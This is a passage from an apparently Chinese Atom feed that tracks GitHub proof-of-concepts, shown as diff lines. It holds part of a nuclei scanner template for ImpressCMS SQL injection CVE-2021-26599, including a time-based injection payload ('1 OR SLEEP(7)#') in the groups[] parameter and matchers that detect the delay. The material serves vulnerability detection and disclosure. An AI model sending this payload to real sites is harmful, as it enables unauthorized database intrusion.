<span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span><br><br>        <span class="hljs-attr">user_submit</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;token<span class="hljs-operator">=</span>&#123;&#123;token&#125;&#125;&amp;groups[]<span class="hljs-operator">=</span><span class="hljs-number">1</span>%<span class="hljs-number">20</span>OR%<span class="hljs-number">20</span>SLEEP(<span class="hljs-number">7</span>)<span class="hljs-comment">#</span><br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> dsl<br>        <span class="hljs-params">dsl:</span><br>          <span class="hljs-operator">-</span> duration<span class="hljs-operator">&gt;=</span><span class="hljs-number">7</span><br>          <span class="hljs-operator">-</span> status_code<span class="hljs-operator">==</span><span class="hljs-number">200</span><br>          <span class="hljs-operator">-</span> contains(body, <span class="hljs-string">&quot;array(1) &#123;&quot;</span>)<br>        <span class="hljs-params">condition:</span> and<br><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; ImpressCMS SQL注入漏洞&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/strong&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;CVE：&lt;/strong&gt; CVE-2021-26599&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;</summary>
-      
-    
-    
-    
-    <category term="Github Poc 监控" scheme="http://example.com/categories/Github-Poc-%E7%9B%91%E6%8E%A7/"/>
-    
-    
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
-    <category term="CVE-2021-26599" scheme="http://example.com/tags/CVE-2021-26599/"/>
-    
-    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
     
   </entry>
   
